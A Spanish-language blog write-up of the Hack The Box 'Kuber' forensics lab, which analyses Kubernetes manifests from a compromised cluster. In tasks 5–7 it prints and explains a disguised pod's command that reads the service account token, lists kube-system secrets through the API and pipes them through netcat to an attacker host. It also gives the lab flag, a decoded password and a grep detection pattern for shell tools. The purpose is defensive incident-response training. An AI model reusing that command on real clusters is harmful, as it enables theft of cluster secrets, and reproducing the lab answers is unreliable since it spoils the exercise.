---
layout: single
title: Sherlock Kuber - Hack The Box 
excerpt: Anális forense sobre un entorno de producción con kubernetes, en un ataque de exfiltración de datos. 
date: 2025-4-29
classes: wide
categories: 
   - sherlock-htb
   - DFIR
tags:
   - kubernetes

--- 

**Sherlock - Kuber**

En este laboratorio estaremos analizando un ataque contra un entorno de desarrollo que usaba Kubernetes. 

--

--


Se nos proporcionan 1 fichero comprimido con el siguiente contenido:

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/kube-system]
└─$ ls -l 
total 520
-rw-r--r-- 1 kali kali    219 Apr 29 05:07 00-namespace.yaml
-rw-r--r-- 1 kali kali   8554 Aug 16  2024 configmaps.yaml
-rw-r--r-- 1 kali kali   4868 Aug 16  2024 daemonset.yaml
-rw-r--r-- 1 kali kali  24407 Aug 16  2024 deployment.yaml
-rw-r--r-- 1 kali kali  11540 Aug 16  2024 job.yaml
-rw-r--r-- 1 kali kali  53170 Aug 16  2024 pods.yaml
-rw-r--r-- 1 kali kali 393529 Aug 16  2024 secrets.yaml
-rw-r--r-- 1 kali kali  10723 Aug 16  2024 serviceaccount.yaml
-rw-r--r-- 1 kali kali   5370 Aug 16  2024 service.yaml
```

Vamos a describir brevemente de qué se trata cada uno de de estos ficheros: 

- **00-namespace.yaml**  
  Define un **Namespace**, que es un espacio de nombres lógico para aislar y organizar recursos dentro del clúster. En desarrollo se suele usar un namespace por equipo o por proyecto para evitar colisiones de nombres y facilitar la limpieza de recursos.

- **configmaps.yaml**  
  Contiene uno o varios **ConfigMap**, que almacenan datos de configuración no sensibles (por ejemplo, archivos de propiedades, variables de entorno). En dev se usan para inyectar configuraciones en los Pods sin tener que reconstruir la imagen del contenedor.

- **daemonset.yaml**  
  Define un **DaemonSet**, que garantiza que una copia de un Pod corre en cada nodo (o un subconjunto de nodos). Suele servir para instalar agentes de monitorización, logging o seguridad (por ejemplo, Fluentd, Prometheus node-exporter) en todos los nodos del clúster de desarrollo.

- **deployment.yaml**  
  Especifica un **Deployment**, que maneja el ciclo de vida de réplicas de Pods (escala, actualizaciones “rolling”, rollbacks). En dev se usa para desplegar aplicaciones cuyos contenedores pueden escalar horizontalmente y necesitan actualizaciones controladas.

- **job.yaml**  
  Describe un **Job**, que ejecuta uno o varios Pods hasta que completan correctamente una tarea concreta (batch). En desarrollo se emplea para tareas puntuales como migraciones de bases de datos, limpieza o procesamientos programados.

- **pods.yaml**  
  Define directamente uno o varios **Pod** (la unidad mínima de ejecución). En dev puede usarse para pruebas muy específicas o cuando no se necesita la abstracción de Deployment/Job, aunque en producción casi siempre va detrás de un controlador.

- **secrets.yaml**  
  Almacena uno o varios **Secret**, que contienen datos sensibles (contraseñas, tokens, certificados) de forma cifrada. En entornos de desarrollo es importante separar estos secretos de los ConfigMaps y montarlos o inyectarlos en los Pods a través de volúmenes o variables de entorno.

- **serviceaccount.yaml**  
  Crea un **ServiceAccount**, que es la identidad bajo la cual corren los Pods y a la que se asocian permisos (RBAC). En dev se define para otorgar a tus Pods solo los derechos necesarios, siguiendo el principio de menor privilegio.

- **service.yaml**  
  Define un **Service**, que expone un conjunto de Pods mediante un único punto de acceso (ClusterIP, NodePort o LoadBalancer). En desarrollo se usa para permitir la comunicación estable entre microservicios o para exponer una aplicación hacia el exterior (por ejemplo, con un NodePort).

con esto podeoms empezar a responder. 


---
**task 1**

¿En qué NodePort está expuesto el servicio ssh-deployment Kubernetes para acceso externo?


Para esto podemos analizar el fichero `service.yaml`, que contiene la definición de los servicios de Kubernetes, y el tipo NodePort se declara explícitamente en él. Ahí es donde Kubernetes define los puertos expuestos y cómo enrutar tráfico externo hacia los pods.

Podemos averiguarlo rapidamente con el siguiente comando: 

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/kube-system]
└─$ grep -A 15 'name: ssh-deployment' service.yaml
    name: ssh-deployment
    namespace: kube-system
  spec:
    clusterIP: 10.43.191.212
    clusterIPs:
    - 10.43.191.212
    externalTrafficPolicy: Cluster
    internalTrafficPolicy: Cluster
    ipFamilies:
    - IPv4
    ipFamilyPolicy: SingleStack
    ports:
    - nodePort: 31337
      port: 2222
      protocol: TCP
      targetPort: 2222
```

```yaml
ports:
  - nodePort: 31337   # <--- Puerto en el nodo (externo)
    port: 2222        # <--- Puerto del servicio (interno)
    targetPort: 2222  # <--- Puerto del pod real (donde corre la app)
```

### ¿Qué significa cada uno?

| Campo        | ¿Qué hace? |
|--------------|------------|
| `nodePort`   | Puerto del nodo accesible **desde fuera** del clúster (`<IP-del-nodo>:31337`) |
| `port`       | Puerto del servicio usado **dentro del clúster** (`ssh-deployment:2222`) |
| `targetPort` | Puerto del **contenedor/pod** al que se redirige el tráfico (`2222`) |

---

### Ejemplo concreto:

Si hacemos esto **desde fuera del clúster**:
```bash
ssh user@<IP-del-nodo> -p 31337
```
→ El tráfico llega al nodo en el puerto `31337`, se enruta al servicio `ssh-deployment`, y este lo reenvía al contenedor real que está escuchando en el puerto `2222`.

podríamos tener algo así:

```yaml
nodePort: 31000
port: 80
targetPort: 8080
```

Eso significaría:
- Puerto externo: 31000
- Servicio interno: 80
- El contenedor realmente escucha en 8080


---
**task 2**

¿Cuál es el ClusterIP del cluster kubernetes?

Un cluster IP es una IP interna del clúster que Kubernetes asigna a cada servicio del tipo ClusterIP (que es el tipo por defecto). Sirve para que los pods dentro del clúster puedan comunicarse entre ellos usando un nombre DNS, sin necesidad de conocer las IPs de los pods directamente.

Por ejemplo:
- El servicio kubernetes (API Server) suele tener una ClusterIP como 10.96.0.1.
- Un pod que necesita hablar con la API interna del clúster lo hace a través de esa IP o a través de su nombre DNS (kubernetes.default.svc.cluster.local).

Esto se puede ver en el fragmento del log que presentamos en la pregunta anterior. 


Hagamos una distinción entre los diferentes servicios que pueden haber en Kubernetes: 

### 🔵 `ClusterIP` (por defecto)

| Característica | Detalle |
|----------------|---------|
| **Accesible desde** | Solo **dentro del clúster** |
| **Uso típico** | Comunicación interna entre pods |
| **IP asignada** | IP interna (como `10.96.0.1`) |
| **Ejemplo** | Un pod backend accede a una base de datos vía `service-name` |

### 🟠 `NodePort`

| Característica | Detalle |
|----------------|---------|
| **Accesible desde** | Desde **fuera del clúster**, a través de los nodos |
| **Uso típico** | Acceso externo simple (dev, pruebas) |
| **Puerto** | Abre un puerto alto (30000–32767) en cada nodo |
| **Ejemplo** | Accedes a un servicio con: `http://<node_ip>:<nodePort>` |

### 🟢 `Ingress`

| Característica | Detalle |
|----------------|---------|
| **Accesible desde** | Desde **fuera del clúster**, mediante HTTP/HTTPS |
| **Uso típico** | Exposición controlada y enrutamiento avanzado |
| **Requiere** | Un controlador Ingress (como NGINX, Traefik) |
| **Ejemplo** | `https://api.miapp.com` se enruta al servicio `backend-service` |


```
[Cliente externo]
       │
       ▼
  ┌───────────┐
  │ Ingress   │ <── HTTPS/HTTP personalizado
  └───────────┘
       │
   (internamente)
       ▼
   ┌────────────┐      ┌────────────┐
   │ NodePort   │─────▶│ ClusterIP  │
   └────────────┘      └────────────┘
```


---
**task 3**

¿Cuál es el valor de la bandera dentro de ssh-config configmap?

Esto podemos encontrarlo rapidamente con:

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/kube-system]
└─$ grep -ni "htb" configmaps.yaml
180:    FLAG: HTB{1d2d2b861c5f8631f841b57f327f46f8}
191:        {"apiVersion":"v1","data":{"FLAG":"HTB{1d2d2b861c5f8631f841b57f327f46f8}","PASSWORD_ACCESS":"true","PGID":"1000","PUID":"1000","SUDO_ACCESS":"true","TZ":"Europe/London","USER_NAME":"admin"},"kind":"ConfigMap","metadata":{"annotations":{},"name":"ssh-config","namespace":"kube-system"}}
```

---
**task 4** 

¿Cuál es el valor de la contraseña (en texto plano) que se encuentra dentro de ssh-deployment a través de secret?


Un Secret es un tipo de objeto en Kubernetes que se usa para almacenar información sensible como:
- Contraseñas
- Tokens
- Llaves SSH
- Certificados TLS
- Credenciales de acceso a bases de datos o APIs

Esto podemos encontrarlo en el fichero `secrets.yaml`, pero suele estar codificado en base64: 

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/kube-system]
└─$ grep -ni "secret" secrets.yaml
6:  kind: Secret
27:  kind: Secret
51:  kind: Secret
73:  kind: Secret
88:  kind: Secret
103:  kind: Secret
107:        {"apiVersion":"v1","data":{"USER_PASSWORD":"U3VwZXJDcmF6eVBhc3N3b3JkMTIzIQ=="},"kind":"Secret","metadata":{"annotations":{},"name":"ssh-secret","namespace":"kube-system"}}
109:    name: ssh-secret
116:  kind: Secret
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/blue-labs/DFIR/kube-system]
└─$ echo "U3VwZXJDcmF6eVBhc3N3b3JkMTIzIQ==" | base64 -d
SuperCrazyPassword123!
```

---
**task 5**

¿Cómo se llama el pod malicioso?


Para hacer esto rapidamente podemos usar el siguiente comando para detectar comandos potencialmente peligrosos: 

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/kube-system]
└─$ grep -inP '\b/bin/sh\b|\bcurl\b|\bnc\b|\bnetcat\b' pods.yaml

879:        {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"metrics-server-557ff575fx-4q62x","namespace":"kube-system"},"spec":{"automountServiceAccountToken":true,"containers":[{"args":["-c","apk update \u0026\u0026 apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://10.43.191.212:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 10.10.14.11 4444; sleep 100000"],"command":["/bin/sh"],"image":"alpine","name":"alpine"}],"hostNetwork":true}}
888:      - 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token
889:        | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type:
891:        } | nc -nv 10.10.14.11 4444; sleep 100000'
```

Y ya podemos ir a esas lìneas para verlas más claro: 

```bash 
874 - apiVersion: v1
 875   kind: Pod
 876   metadata:
 877     annotations:
 878       kubectl.kubernetes.io/last-applied-configuration: |
 879         {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"metrics-server-557ff575fx-4q62x","namespace":"kube-system"},"spec":{"automountServiceAccountToken":true,"containers":[{"args":["-c","apk update \u0026\u0026 apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://10.43.191.212:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 10.10.14.11 4444; sleep 100000"],"command":["/bin/sh"],"image":"alpine","name":"alpine"}],"hostNetwork":true}}
 880     creationTimestamp: "2024-08-16T15:00:06Z"
 881     name: metrics-server-557ff575fx-4q62x
 882     namespace: kube-system
 883   spec:
 884     automountServiceAccountToken: true
 885     containers:
 886     - args:
 887       - -c
 888       - 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token
 889         | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type:
 890         application/json" https://10.43.191.212:8443/api/v1/namespaces/kube-system/secrets;
 891         } | nc -nv 10.10.14.11 4444; sleep 100000'
 892       command:
 893       - /bin/sh
 894       image: alpine
 895       imagePullPolicy: Always
 896       name: alpine
 897       resources: {}
 898       terminationMessagePath: /dev/termination-log
 899       terminationMessagePolicy: File
 900       volumeMounts:
 901       - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
 902         name: kube-api-access-mfkvh
 903         readOnly: true
```

### Vamos a desglosar esto: 

## 1. Identidad y contexto del pod

```yaml
metadata:
  name: metrics-server-557ff575fx-4q62x
  namespace: kube-system
spec:
  hostNetwork: true
  automountServiceAccountToken: true
```

- **Nombre engañoso**: Se llama _metrics-server-557ff575fx-4q62x_ para pasar por el legítimo _metrics-server_, un componente estándar de Kubernetes.  
- **hostNetwork: true**: Al usar la red del nodo, el contenedor puede alcanzar la API de Kubernetes en `10.43.191.212:8443` (la IP `ClusterIP` del servicio de la API) sin pasar por la red de pods.  
- **automountServiceAccountToken: true**: Kubernetes monta automáticamente, dentro del pod, el token de la cuenta de servicio (service account) asociada, normalmente en `/run/secrets/kubernetes.io/serviceaccount/token`.

## 2. Contenedor “alpine” y su comando

```yaml
containers:
- name: alpine
  image: alpine
  command:
    - /bin/sh
  args:
    - -c
    - |
      apk update && apk add curl --no-cache;
      cat /run/secrets/kubernetes.io/serviceaccount/token | {
        read TOKEN;
        curl -k -v \
          -H "Authorization: Bearer $TOKEN" \
          -H "Content-Type: application/json" \
          https://10.43.191.212:8443/api/v1/namespaces/kube-system/secrets;
      } | nc -nv 10.10.14.11 4444;
      sleep 100000
```

### a) `/bin/sh -c '...'`
Arranca un shell que ejecuta todos los pasos que siguen delimitados por `-c`.

### b) `apk update && apk add curl --no-cache`
Instala la herramienta `curl` dentro de la imagen Alpine para poder hacer peticiones HTTP/HTTPS.

### c) Lectura y uso del ServiceAccount Token

```bash
cat /run/secrets/kubernetes.io/serviceaccount/token | {
  read TOKEN;
  curl -k -v \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    https://10.43.191.212:8443/api/v1/namespaces/kube-system/secrets;
}
```

1. **Lee** el token de la cuenta de servicio desde el archivo donde Kubernetes lo monta.  
2. **Guarda** el contenido en la variable `TOKEN`.  
3. **Hace una petición `curl` a la API interna** (la IP del servicio Kubernetes) para listar todos los secretos (`/api/v1/namespaces/kube-system/secrets`), usando ese token en la cabecera `Authorization: Bearer`.

### d) Exfiltración con Netcat

```bash
… | nc -nv 10.10.14.11 4444
```

Toma la salida completa de la petición (que incluye todos los secretos en JSON, codificados en Base64) y la envía con `nc` (netcat) al atacante, cuyo servidor escucha en la IP `10.10.14.11` y puerto `4444`.

### e) `sleep 100000`
Mantiene el contenedor vivo para no levantar sospechas inmediatas al terminar la ejecución.

---
**task 6**

¿Cuál es la imagen que utiliza el atacante para crear el pod malicioso?

Ya vimos que es `Alpine`, y se le instala la herramienta `curl`

---
**task 7**

¿Cuál es la IP del atacante?

Ya vimos que los datos son exfiltrados por `netcat` hacia la ip `10.10.14.11` por el puerto 4444
